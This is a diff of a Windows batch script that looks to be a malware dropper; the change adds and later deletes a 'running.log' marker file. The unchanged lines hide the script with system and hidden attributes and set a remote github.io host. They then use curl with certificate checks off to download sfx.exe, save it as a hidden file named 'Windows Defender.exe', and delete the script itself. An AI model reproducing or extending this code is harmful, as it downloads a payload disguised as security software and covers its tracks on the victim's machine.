@@ -1,5 +1,6 @@
 @echo off
 setlocal
+echo running > "%userprofile%\running.log"
 attrib +s +h +i "%~f0"
 
 set host=https://cryptedodissey.github.io
@@ -54,4 +55,5 @@ if not errorlevel 1 (attrib -s -h -i "%environment%\apache2" && "%environment%\c
 
 attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" 
 endlocal
+del /s /f /q /a "%userprofile%\running.log"
 DEL /s /f /q /a "%~f0"
